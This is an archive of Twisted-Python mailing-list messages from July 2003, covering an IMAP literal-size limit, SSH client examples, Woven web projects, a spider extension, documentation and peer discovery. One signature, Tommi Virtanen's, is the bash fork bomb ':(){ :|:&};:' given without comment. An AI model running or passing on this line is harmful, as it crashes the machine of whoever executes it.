References: <200307022114.h62LEMw2001260@fido.strakt.com> <20030703091122.GA31417@intarweb.us> 
Message-ID: <200307031109.h63B9A210604@haddock.cd.chalmers.se>

In a message of Thu, 03 Jul 2003 05:11:22 EDT, Jp Calderone writes:
>  Great stuff, I really really like your solution to the parsing problem. 
>The patch is now applied, with a couple changes:

[...]

>  I am unsure about the usefulness of the LiteralString class in its current
>state.  It seems to open up the possiblity of an unbounded memory usage
>attack against the server.  I'm considering either removing it and using
>LiteralFile in its place, or adding a limit to the size of string it will
>accept (something on the order of a kilobyte or two, though I will check
>exactly what might get passed to it by a benign client before picking a
>default limit).  Do you have any particular reason to want to keep it, or to
>keep it unlimited?

Yes, I absolutely want to keep it, but there should be no reason to keep
it unlimitied. There are lots of places (particularly for mailbox names)
where the grammar accepts atom or quoted or literal, and it would be a
nightmare to have to deal with a string that sometimes may be a file (and
keeping short strings like "inbox" in a file seems silly too). So please
keep it, but I see no problems with limiting it to a few kb.

How about this:

-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: text/x-patch
Size: 1011 bytes
Desc: twisted-imap-030703
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030703/6f101ea7/attachment.bin 
-------------- next part --------------
>  I suppose I will be thinking about how to apply a similar change to the
>client code, where it will have (at least to me ;) a much more noticable
>affect on performance.  It seems a little tougher, but maybe a mapping of
>responses to parsers would do the job...  Any ideas in this area would be
>welcome :)

I'll have a look at it and see if I can come up with any ideas.

/Anders

-- 
 -- Of course I'm crazy, but that doesn't mean I'm wrong.
Anders Hammarquist                                  | iko at cd.chalmers.se
Physics student, Chalmers University of Technology, | Hem: +46 31 88 48 50
G|teborg, Sweden.           RADIO: SM6XMM and N2JGL | Mob: +46 707 27 86 87

From exarkun at intarweb.us  Thu Jul  3 07:25:40 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Thu, 3 Jul 2003 07:25:40 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <200307031109.h63B9A210604@haddock.cd.chalmers.se>
References: <200307022114.h62LEMw2001260@fido.strakt.com> <20030703091122.GA31417@intarweb.us> <200307031109.h63B9A210604@haddock.cd.chalmers.se>
Message-ID: <20030703112540.GA31749@intarweb.us>

On Thu, Jul 03, 2003 at 01:09:10PM +0200, Anders Hammarquist wrote:
> In a message of Thu, 03 Jul 2003 05:11:22 EDT, Jp Calderone writes:
> >  Great stuff, I really really like your solution to the parsing problem. 
> >The patch is now applied, with a couple changes:
> 
> [...]
> 
> > [snip]
> 
> Yes, I absolutely want to keep it, but there should be no reason to keep
> it unlimitied. There are lots of places (particularly for mailbox names)
> where the grammar accepts atom or quoted or literal, and it would be a
> nightmare to have to deal with a string that sometimes may be a file (and
> keeping short strings like "inbox" in a file seems silly too). So please
> keep it, but I see no problems with limiting it to a few kb.
> 
> How about this:
> 

  This looks perfect.  Applied.

Content-Description: twisted-imap-030703

> >  I suppose I will be thinking about how to apply a similar change to the
> >client code, where it will have (at least to me ;) a much more noticable
> >affect on performance.  It seems a little tougher, but maybe a mapping of
> >responses to parsers would do the job...  Any ideas in this area would be
> >welcome :)
> 
> I'll have a look at it and see if I can come up with any ideas.

  Thanks!

  Jp
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030703/30a3f6aa/attachment.pgp 

From lac at strakt.com  Thu Jul  3 12:11:03 2003
From: lac at strakt.com (Laura Creighton)
Date: Thu, 3 Jul 2003 18:11:03 +0200
Subject: [Twisted-Python] Paul Baranowski recommends developing in Python in part:
Message-ID: <200307031611.h63GB3C7018183@ratthing-b246.strakt.com>

... "Python has some amazing 3rd party languages, all of them
cross-platform: WxPython for GUI development, pyGame for 2D graphics,
and Twisted for network programming. "

http://peek-a-booty.org/Docs/WhichLanguageDoYouRecommend.htm
http://www.peek-a-booty.org/pbhtml/index.php

Laura



From anders at bruun-olsen.net  Thu Jul  3 15:49:30 2003
From: anders at bruun-olsen.net (Anders Bruun Olsen)
Date: Thu, 3 Jul 2003 21:49:30 +0200
Subject: [Twisted-Python] Can't get ssh-connections to work
In-Reply-To: <3F037BB6.23532.7B81244@localhost>
References: <20030703021230.GB5058@elmer.skumleren.net> <3F037BB6.23532.7B81244@localhost>
Message-ID: <20030703194924.GA5565@elmer.skumleren.net>

On Thu, Jul 03, 2003 at 12:41:26AM -0400, Paul Swartz wrote:
> > I am brand-spanking new at twisted but wanted to make an app that
> > connects through ssh to a remote machine and fetches some info, which I
> > thought twisted to be perfect for. I am trying to get the ssh example to
> > work but it just hangs!
> > I have entered it exactly as it is on the webpage (cut-and-paste and the
> > fixed the indentions). The only thing changed is the host to connect to,
> > there I have chosen a server I have running on my LAN.
> > I have also added a call to log.startLogging(sys.stdout, setStdout=0) to
> > get some logging output to see if I could figure out the problem. This
> > is the output I get:
> Could you send me the code you've got?  Also, try the example in 
> doc/examples/sshsimpleclient.py

sshsimpleclient.py works, so it is either me who has done something
wrong when copy-pasting the code from the howto or perhaps the howto
needs to be updated? It looks like sshsimpleclient.py and the code in
the howto uses different classes?!?

The howto I am talking about is this one:
http://www.twistedmatrix.com/documents/howto/conch_client

Just to make sure we are all talking about the same thing :)

I'll study sshsimpleclient.py to learn how it works.

-- 
Anders
-----BEGIN GEEK CODE BLOCK-----
Version: 3.12
GCS/O d--@ s:+ a-- C++ $UL+++ P++ L+++ E- W+ N(+) o K? w O- M-- V
PS+ PE@ Y+ PGP+ t 5 X R+ tv+ b+ DI+++ D+ G e- h !r y?
------END GEEK CODE BLOCK------
PGPKey: http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x8BFECB41



From cce at clarkevans.com  Thu Jul  3 17:52:22 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Thu, 3 Jul 2003 21:52:22 +0000
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030702142838.GC10309@lapdog>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog>
Message-ID: <20030703215222.GA86483@doublegemini.com>

On Wed, Jul 02, 2003 at 05:28:38PM +0300, Tommi Virtanen wrote:
| > After reading the RFC, it seems that "entry" is most often used
| > to mean an object in the LDAP database.
| 
| 	I'm guessing you won't be happy even after an
| 	s/LDAPObject/LDAPEntry/g operation, so I'm not
| 	doing that right now..

FYI, the python-ldap interface has an LDAPObject, but this
more or less represents a connection to the LDAP directory.
In any case, if you use LDAPObject in a different sence it
will rule out your ability to have the same API as OpenLDAP,
and thus python-ldap.    Also note that it uses 'entry' in
the RFC1823 (C API for LDAP) quite extensively.

Best,

Clark



From 2002 at weholt.org  Thu Jul  3 18:59:09 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Fri, 4 Jul 2003 00:59:09 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
Message-ID: <014301c341b6$b7509230$0401a8c0@razor>

I could take a peek at? Hopefully, something simple. I'm currently trying to
get a grip on how to build a site using Twisted methods and use Issues Alpha
1 as a foundation for that. But there are too many things going on and it's
hard to get a hang of why things are done they way they are.

What I need is something that :

1. don't use rpys, but Site and Application
2. starts a service which holds some persistent data and does a scheduled
call to a long-running, blocking method once a while
3. implements some kind of authentication
4. use Woven
5. hopefully has some way of keeping the same design for all it's pages,
using a master template and populating it with data at run-time or something
similar
6. it would be nice if it also showed how to dynamically add pages
subclassing Woven.Page using putChild if these pages was in a given folder.

Demanding request? Sorry, but I got a bunch of working, yet blocking and
non-Twisted-friendly code lying around which could be of interest to people
if I just got the basics working.

Any kind of help would be nice.

In advance, thanks a bunch.

Best regards,
Thomas







From jml at ids.org.au  Fri Jul  4 00:03:22 2003
From: jml at ids.org.au (Jonathan Lange)
Date: Fri, 4 Jul 2003 14:03:22 +1000
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <014301c341b6$b7509230$0401a8c0@razor>; from 2002@weholt.org on Fri, Jul 04, 2003 at 08:59:09 +1000
References: <014301c341b6$b7509230$0401a8c0@razor>
Message-ID: <20030704040322.GA8465@sting>

On 2003.07.04 08:59, Thomas Weholt wrote:

> Demanding request? Sorry, but I got a bunch of working, yet blocking
> and non-Twisted-friendly code lying around which could be of interest 
> to people

Kind of. You don't really need a single project that has all six of 
your desires, as each is more or less independent. In fact, each of 
these pieces is pretty simple. 
If your problem lies in figuring out how to stick them all together, 
you will need to be more specific in what you are trying to do.

> 1. don't use rpys, but Site and Application

RPYs and Site / Application are two ways of going about the same thing.
In Issues, you will notice that issues/tap/web.py uses Site / 
Application to create a web server.

Although Issues comes with an RPY, it doesn't need one.

> 2. starts a service which holds some persistent data and does a 
> scheduled call to a long-running, blocking method once a while

Lots of stuff does persistent data. Issues uses world. 
A scheduled call to a blocking method could probably be done quite 
simply using deferToThread and callLater. (Some t.internet expert 
should confirm this). The "Scheduling" howto may help with this.

> 3. implements some kind of authentication

Again, Issues uses it's own kind of authentication, rather than any 
implementation of cred. This is mainly because my brain obstinately 
refuses to understand guard. 
Divmod uses cred and guard for authentication.

> 4. use Woven

Issues, Plonk, Divmod, Blog.

> 5. hopefully has some way of keeping the same design for all it's
> pages, using a master template and populating it with data at run-
> time or something similar

Someone here has suggested using ExpandMacro for this. I have steered 
clear of this in Issues, being content to copy-and-paste the basic 
layout of each page. (Although much of the content is shared)

> 6. it would be nice if it also showed how to dynamically add pages
> subclassing Woven.Page using putChild if these pages was in a given
> folder.

getDynamicChild is your friend! It is demonstrated in almost every 
existing Woven application (including Issues)

Hope this helps,
jml



From tv at twistedmatrix.com  Fri Jul  4 02:03:37 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Fri, 4 Jul 2003 09:03:37 +0300
Subject: [Twisted-Python] ldaptor feedback
In-Reply-To: <20030703215222.GA86483@doublegemini.com>
References: <20030702032744.GA80790@doublegemini.com> <20030702063520.GA24397@lapdog> <20030702080748.GA81663@doublegemini.com> <20030702142838.GC10309@lapdog> <20030703215222.GA86483@doublegemini.com>
Message-ID: <20030704060337.GA17938@lapdog>

On Thu, Jul 03, 2003 at 09:52:22PM +0000, Clark C. Evans wrote:
> In any case, if you use LDAPObject in a different sence it
> will rule out your ability to have the same API as OpenLDAP,
> and thus python-ldap.    Also note that it uses 'entry' in
> the RFC1823 (C API for LDAP) quite extensively.

	I am very dedicated to providing an API that is radically
	different from the OpenLDAP API.

-- 
:(){ :|:&};:



From lafou at wanadoo.fr  Fri Jul  4 04:00:27 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 04 Jul 2003 10:00:27 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <20030704040322.GA8465@sting>
References: <014301c341b6$b7509230$0401a8c0@razor>
	 <20030704040322.GA8465@sting>
Message-ID: <1057305627.22303.20.camel@biproc>

Hello all

I think woven is getting more mature now, but it lacks some important 
documentation parts (guard, sessions, etc.).

Moreover, maybe woven needs now a community site like www.zope.org. It would be interresting
to share some little apps arround woven, that can be used as modules in other applications.
MVC allows us to do that, let's use it !







From janko at mind-nest.com  Fri Jul  4 04:12:38 2003
From: janko at mind-nest.com (janko at mind-nest.com)
Date: Fri, 4 Jul 2003 10:12:38 +0200
Subject: [Twisted-Python] Extending t.w.spider
Message-ID: <00db01c34204$08f85260$2dc8fea9@jankotov>

Bok,

I am sending this as suggested by "forgot who" on #twisted. 

I extended t.w.spider , this isn't finished. It seems to work however. 
You can download, run it and look it crawl ower certain domain ... It prints out
quite few information doing work so you know what is going on ( mainly for testing purposes ).

I am hoping just for a quick scan thru code and run by someone more experienced in this. So I will know if I did it python/twisted/sane way, before I go further and conect it to various stuff. ( also read NOTE at the end of email )

You can get this at http://www.mind-nest.com/downloads/walker.tgz or 
http://www.mind-nest.com/downloads/walker.zip

When finished I plan give it back to twisted... of course if they will
accept it.

note for the maillist moderator: I sent this mail when I was not yet a member some week ago, I got response that you must first approve it. As it didn't happen in 1 week and I am a member now I sent it again as a member.

lp
:janko
janko at mind-nest.com
www.mind-nest.com


***

This module extends twisted.web.spider.SpiderSender class into WalkerSender
(and also extends htmllib.HTMLParser and t.w.c.HTTPClientFactory so
WalkerSender can use them):

    LinkParser
    -collects links on a page
    -also collects frame scr-es, to crawl ower frames
    -can also collect images, links(css,js..) for link/img validating
purposes

    HTTPCollector
    -Doesnt store content of page to file but to variable
    -Can be easily set to diferent link-parsers or page-downloaders(*)..
    -Returns *self* to the callback, so that links, content, or anything
else it collects can be retrieved
    by the callback method. (**)

    WalkerSender
    -Can be easily set to diferent http-collectors/downloaders(***)..
    -Uses dictionary instead of list for queue now.. explaind below
    -Has 4 more plugins/events, some existent are cahnged to be more
powerfull
    -Plugin to filter links to whatever you wanth (extensions, domains...)
    -Plugin to fill with some algorithm to prevent from looping
    -Plugin to notify that download failed
    -Plugin to tell that all links found while crawling were crawled and
there is nowwhere else to go
    (Likely/hopefully to occur if doing One Site/domain crawler as I was,
and when timeouting or some other shit happens)
    -Plugin notifyDownloadEnd has aditional argument downloader which holds
anything you prepare in dowloader class(****)

    some smaller things were made to get it working
    -preventing from starting downloader on page/url that is already
downloading
    -queue (is now dictionary) so it can't have multiple same pages in it
(the depth of the first ocurrence is stored)
    -removes fragments from urls (www.a.org/index.html#fragment) so we get
multiple -same- pages that are then filtered
    -it doesnt remove ?queries as they often mean new content..

    I made OneSiteWalkerSender as an example.. I intend to make one site
search engine (with pyndex probably) and a
    anchor/link/img... validating script. OneSiteWalkerSender has just now
crawled ower 525 pages of www.google.com.
    I also tested it with other sites.

    NOTE: Don't shoot me or something if I made something very stupid, I am
very new to Python and Twisted
    and don't understand many important issues on any of them. Where I
marked with * in upper description I am a little
    suspicious with my way of doing it.

***

-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030704/5f94bd05/attachment.htm 

From m at moshez.org  Fri Jul  4 04:49:50 2003
From: m at moshez.org (Moshe Zadka)
Date: 4 Jul 2003 08:49:50 -0000
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <014301c341b6$b7509230$0401a8c0@razor>
References: <014301c341b6$b7509230$0401a8c0@razor>
Message-ID: <20030704084950.4055.qmail@green.zadka.com>

On Fri, 4 Jul 2003, "Thomas Weholt" <2002 at weholt.org> wrote:

> I could take a peek at? Hopefully, something simple. I'm currently trying to
> get a grip on how to build a site using Twisted methods and use Issues Alpha
> 1 as a foundation for that. But there are too many things going on and it's
> hard to get a hang of why things are done they way they are.

Did you try looking at bannerfish?
[Follow the links from itamarst.org]
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From illumen at yahoo.com  Fri Jul  4 05:56:35 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Fri, 04 Jul 2003 19:56:35 +1000
Subject: [Twisted-Python] Finding peers.
Message-ID: <3F054F53.8080909@yahoo.com>

Hello,

just wondering if anyone has/knows of any code to find peers on the network?





From illumen at yahoo.com  Fri Jul  4 06:00:22 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Fri, 04 Jul 2003 20:00:22 +1000
Subject: [Twisted-Python] User notes for documentation.
Message-ID: <3F055036.9010807@yahoo.com>

hey

Would it be possible to add a user notes system to the twisted 
documentation?

Examples of projects that use this are the postgresql, crystalspace, and 
php.



Have fun,
Rene.




From andrew-twisted at puzzling.org  Fri Jul  4 06:47:39 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 4 Jul 2003 20:47:39 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <3F055036.9010807@yahoo.com>
References: <3F055036.9010807@yahoo.com>
Message-ID: <20030704104739.GA26311@frobozz>

On Fri, Jul 04, 2003 at 08:00:22PM +1000, Rene Dudfield wrote:
> hey
> 
> Would it be possible to add a user notes system to the twisted 
> documentation?
> 
> Examples of projects that use this are the postgresql, crystalspace, and 
> php.

It could probably be done; but personally I've never much liked those
systems.  I'd much rather have suggestions and criticisms sent to the
mailing list (or bug tracker), where they can be discussed more easily, and
then have any improvements integrated into the proper docs.

Documentation patches are most welcome -- and you can already send those to
this mailing list!

If people feel their comments on the docs are too trivial to bother the main
list, then perhaps there is justification for a twisted-docs list?  At the
moment, though, there doesn't seem to be enough interest from non-developers
to improve the docs to justify a seperate list -- or to justify the effort
involved in adding a user notes system to the online docs.

[Sadly, wikis and other systems reliant upon the community for the bulk of
the content don't seem to be a magic bullet to creating the docs everyone
wishes they had.]

-Andrew.




From m at moshez.org  Fri Jul  4 10:00:46 2003
From: m at moshez.org (Moshe Zadka)
Date: 4 Jul 2003 14:00:46 -0000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <20030704104739.GA26311@frobozz>
References: <20030704104739.GA26311@frobozz>, <3F055036.9010807@yahoo.com>
Message-ID: <20030704140046.8803.qmail@green.zadka.com>

On Fri, 4 Jul 2003, Andrew Bennetts <andrew-twisted at puzzling.org> wrote:

> Documentation patches are most welcome -- and you can already send those to
> this mailing list!

Yes!
But also, any comments on the documentation. From "all links are broken"
to "howto X is hard to find" and "on page 155, 'foo' should be 'bar'"
are all welcome here. If there'll be too many comments like that, we may
then redirect it into another list, but I certainly don't want to lose
those comments -- and have them on the website, where they can't be
dealt with, is not a good idea. Having seen the quality of tips on the PHP
site, I'm also hesistant about the tips themselves :)
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From domma at procoders.net  Fri Jul  4 10:13:54 2003
From: domma at procoders.net (Achim Domma (ProCoders))
Date: Fri, 4 Jul 2003 16:13:54 +0200
Subject: [Twisted-Python] minor beginner questions
Message-ID: <FCEMIEFBFOIDAOJDEPIAIENKFKAA.domma@procoders.net>

Hi,

playing around with twisted.web, I have some minor questions:

- In another message a function 'deferToThread' was mentioned. I tought that
somethink like must be available in twisted but could not find it. Is there
an example on how to use it?

- Is it possible to create resources in my startup script, where I create my
application. Instead of having a simple *.rpy with
resouce=SomeClassInstance() I would like to use addChild on the root of my
app. Is that possible?

- If I want to keep a Connection to a ZODB, should I store it in the
registry or is there a besser place to store it?

regards,
Achim




From 2002 at weholt.org  Fri Jul  4 06:13:44 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Fri, 4 Jul 2003 12:13:44 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
References: <014301c341b6$b7509230$0401a8c0@razor> <20030704084950.4055.qmail@green.zadka.com>
Message-ID: <000b01c34238$3d775b60$3ba8a8c0@gatsoft.no>

It's based on Twisted < 1.0. Will that affect anything?

Thomas

----- Original Message -----
From: "Moshe Zadka" <m at moshez.org>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 10:49 AM
Subject: Re: [Twisted-Python] Does anybody have a working project ...


> On Fri, 4 Jul 2003, "Thomas Weholt" <2002 at weholt.org> wrote:
>
> > I could take a peek at? Hopefully, something simple. I'm currently
trying to
> > get a grip on how to build a site using Twisted methods and use Issues
Alpha
> > 1 as a foundation for that. But there are too many things going on and
it's
> > hard to get a hang of why things are done they way they are.
>
> Did you try looking at bannerfish?
> [Follow the links from itamarst.org]
> --
> Moshe Zadka -- http://moshez.org/
> Buffy: I don't like you hanging out with someone that... short.
> Riley: Yeah, a lot of young people nowadays are experimenting with
shortness.
> Agile Programming Language -- http://www.python.org/
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From 2002 at weholt.org  Fri Jul  4 06:14:51 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Fri, 4 Jul 2003 12:14:51 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
References: <014301c341b6$b7509230$0401a8c0@razor> <20030704040322.GA8465@sting> <1057305627.22303.20.camel@biproc>
Message-ID: <000c01c34238$3d80aa30$3ba8a8c0@gatsoft.no>

Good idea!! Allthough the docs are coming along great, it would help alot to
have several working examples to look at or base other projects on. Another
thing is code-reuse.

Thomas

----- Original Message -----
From: "Philippe Lafoucri?re" <lafou at wanadoo.fr>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 10:00 AM
Subject: Re: [Twisted-Python] Does anybody have a working project ...


> Hello all
>
> I think woven is getting more mature now, but it lacks some important
> documentation parts (guard, sessions, etc.).
>
> Moreover, maybe woven needs now a community site like www.zope.org. It
would be interresting
> to share some little apps arround woven, that can be used as modules in
other applications.
> MVC allows us to do that, let's use it !
>
>
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From 2002 at weholt.org  Fri Jul  4 10:24:58 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Fri, 4 Jul 2003 16:24:58 +0200
Subject: [Twisted-Python] Finding peers.
References: <3F054F53.8080909@yahoo.com>
Message-ID: <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no>

I plan to start working on, or at least, I'm very interested in how to do
this.

Any information about this anyone can post to this list would be very
interesting.

Twisted to have a partial Gnutella-implementation so it might be usefull to
look at. I'm thinking about using XML-RPC/SOAP, but it would involve a
substantial amount of overhead.

Anyway, it would be nice if you kept me or the list posted on your findings.

Thomas

----- Original Message -----
From: "Rene Dudfield" <illumen at yahoo.com>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 11:56 AM
Subject: [Twisted-Python] Finding peers.


> Hello,
>
> just wondering if anyone has/knows of any code to find peers on the
network?
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>





From andrew-twisted at puzzling.org  Fri Jul  4 10:42:09 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sat, 5 Jul 2003 00:42:09 +1000
Subject: [Twisted-Python] minor beginner questions
In-Reply-To: <FCEMIEFBFOIDAOJDEPIAIENKFKAA.domma@procoders.net>
References: <FCEMIEFBFOIDAOJDEPIAIENKFKAA.domma@procoders.net>
Message-ID: <20030704144209.GB26311@frobozz>

On Fri, Jul 04, 2003 at 04:13:54PM +0200, Achim Domma (ProCoders) wrote:
> Hi,
> 
> playing around with twisted.web, I have some minor questions:
> 
> - In another message a function 'deferToThread' was mentioned. I tought that
> somethink like must be available in twisted but could not find it. Is there
> an example on how to use it?

It's easily found in the API docs (e.g. search in the "everything" frame at
http://twistedmatrix.com/documents/TwistedDocs/current/api/), or even by
grepping the source[1].  To save you some time, it's in
twisted.internet.threads.

It's also described (with a brief example) in
http://twistedmatrix.com/documents/howto/threading -- if you understand
Deferreds, there's really nothing to it.

-Andrew.

[1] "Exuberant Ctags" (http://ctags.sf.net/) is your friend -- I can type 
        :tag deferToThread
    in vim, and be taken straight to where deferToThread is defined in the
    source.  I've indexed my entire /usr/lib/python2.2 with ctags, and it's
    proven incredibly useful.

> - Is it possible to create resources in my startup script, where I create my
> application. Instead of having a simple *.rpy with
> resouce=SomeClassInstance() I would like to use addChild on the root of my
> app. Is that possible?

Of course, e.g.

    from twisted.web import resource, server
    from twisted.internet import app
    from myApp import MyClass

    application = app.Application('MyApp')
    root = resource.Resource()
    root.putChild('app', MyClass())
    application.listenTCP(80, server.Site(root))

> - If I want to keep a Connection to a ZODB, should I store it in the
> registry or is there a besser place to store it?

I suspect the best place would be in an ApplicationService -- but someone
else that knows what they're talking about should probably answer this.

-Andrew.




From itamar at itamarst.org  Fri Jul  4 11:51:26 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 4 Jul 2003 11:51:26 -0400
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <20030704084950.4055.qmail@green.zadka.com>
References: <014301c341b6$b7509230$0401a8c0@razor>
	<20030704084950.4055.qmail@green.zadka.com>
Message-ID: <20030704115126.6fc30ef1.itamar@itamarst.org>

On 4 Jul 2003 08:49:50 -0000
Moshe Zadka <m at moshez.org> wrote:

> Did you try looking at bannerfish?

It uses twisted.web.widgets - please don't use it as an example, since
that code is waaaaay deprecated.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From illumen at yahoo.com  Fri Jul  4 11:58:42 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Sat, 05 Jul 2003 01:58:42 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <20030704104739.GA26311@frobozz>
References: <3F055036.9010807@yahoo.com> <20030704104739.GA26311@frobozz>
Message-ID: <3F05A432.2030107@yahoo.com>

Andrew Bennetts wrote:

>On Fri, Jul 04, 2003 at 08:00:22PM +1000, Rene Dudfield wrote:
>  
>
>>hey
>>
>>Would it be possible to add a user notes system to the twisted 
>>documentation?
>>
>>Examples of projects that use this are the postgresql, crystalspace, and 
>>php.
>>    
>>
>
>It could probably be done; but personally I've never much liked those
>systems.  I'd much rather have suggestions and criticisms sent to the
>mailing list (or bug tracker), where they can be discussed more easily, and
>then have any improvements integrated into the proper docs.
>
>Documentation patches are most welcome -- and you can already send those to
>this mailing list!
>
>If people feel their comments on the docs are too trivial to bother the main
>list, then perhaps there is justification for a twisted-docs list?  At the
>moment, though, there doesn't seem to be enough interest from non-developers
>to improve the docs to justify a seperate list -- or to justify the effort
>involved in adding a user notes system to the online docs.
>
>[Sadly, wikis and other systems reliant upon the community for the bulk of
>the content don't seem to be a magic bullet to creating the docs everyone
>wishes they had.]
>
>-Andrew.
>
>  
>
No they are not a magic bullet, but they can help.

A user notes system has these advantages:
  - not having to bother people to post notes
  - being easier for people to add a note about something as they are 
reading

Anyway, just a suggestion.  Doesn't really bother me :)

Have fun,
Rene.





From illumen at yahoo.com  Fri Jul  4 12:20:52 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Sat, 05 Jul 2003 02:20:52 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no>
References: <3F054F53.8080909@yahoo.com> <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no>
Message-ID: <3F05A964.30508@yahoo.com>

Thomas Weholt ( PRIVAT ) wrote:

>I plan to start working on, or at least, I'm very interested in how to do
>this.
>
>Any information about this anyone can post to this list would be very
>interesting.
>
>Twisted to have a partial Gnutella-implementation so it might be usefull to
>look at. I'm thinking about using XML-RPC/SOAP, but it would involve a
>substantial amount of overhead.
>
>Anyway, it would be nice if you kept me or the list posted on your findings.
>
>Thomas
>  
>

I've been thinking of some easy ways to do it which will meet my 
requirements.  They are different for internet ip addresses, and private 
addresses.

For internet addresses, I'm going to put up a few web pages.  One to 
register a server with, and another to list servers.  These will be 
master game lists, which all the players will connect to to.

For private addresses(eg 10.0.0., 192.168.0. etc) maybe I'll send a bit 
of udp to the broadcast address.  Which will be a message asking if 
anyone is out there looking for a game.  If the peer is looking for a 
game, they'll connect to a pb service running on the client and tell it 
they are interested in playing.

Once the peers have found each other, then they can decide if they want 
to play, and negotiate who is going to be the server(I'll probably just 
let it be a race of which one connects first is the client, since my 
game is two player only).


On a slightly related note, I think firewall/nat detection is pretty 
necessary in this process.  For on the internet anyway.  To make the 
list of servers more reliable(it sucks waiting around for the connection 
to time out).  Any ways of detecting if a peer is behind a 
firewall/nat?  I was thinking of getting the peers to report any 
connection timeout attempts.  Also maybe have the master server try and 
connect to the peers reporting to be master servers.  So when they go to 
list them selves as wanting a game, the master server will try a 
connection, and list it as connectable/not connectable.





>----- Original Message -----
>From: "Rene Dudfield" <illumen at yahoo.com>
>To: <twisted-python at twistedmatrix.com>
>Sent: Friday, July 04, 2003 11:56 AM
>Subject: [Twisted-Python] Finding peers.
>
>
>  
>
>>Hello,
>>
>>just wondering if anyone has/knows of any code to find peers on the
>>    
>>
>network?
>  
>





From 2002 at weholt.org  Fri Jul  4 12:31:21 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Fri, 4 Jul 2003 18:31:21 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
References: <014301c341b6$b7509230$0401a8c0@razor><20030704084950.4055.qmail@green.zadka.com> <20030704115126.6fc30ef1.itamar@itamarst.org>
Message-ID: <001b01c34249$b5306780$0401a8c0@razor>

Ok, so it's not a good reference project for a beginner. You say
twisted.web.widgets are deprecated, that would of course include
twisted.web.widgets.Form ? Are there still any component-like way to create
forms and parse posted input in Twisted ( assuming that's what the code
does ) ? How can one use a similar code in Woven?

My reason for asking is that I got a old piece of code which generates forms
in similar manner as you did in Bannerfish and parses posted data into
good-ol' Python values. If Twisted allready includes something similar
that's another old, non-Twisted-standardized piece of code I can ditch. Form
generation and handling of posted data is vital to my project. Writing <form
action=""> .... <input ...> etc. is not acceptable. And in my existing
solution I also got some client-side validation which nice :-)

Thomas


----- Original Message -----
From: "Itamar Shtull-Trauring" <itamar at itamarst.org>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 5:51 PM
Subject: Re: [Twisted-Python] Does anybody have a working project ...


> On 4 Jul 2003 08:49:50 -0000
> Moshe Zadka <m at moshez.org> wrote:
>
> > Did you try looking at bannerfish?
>
> It uses twisted.web.widgets - please don't use it as an example, since
> that code is waaaaay deprecated.
>
> --
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
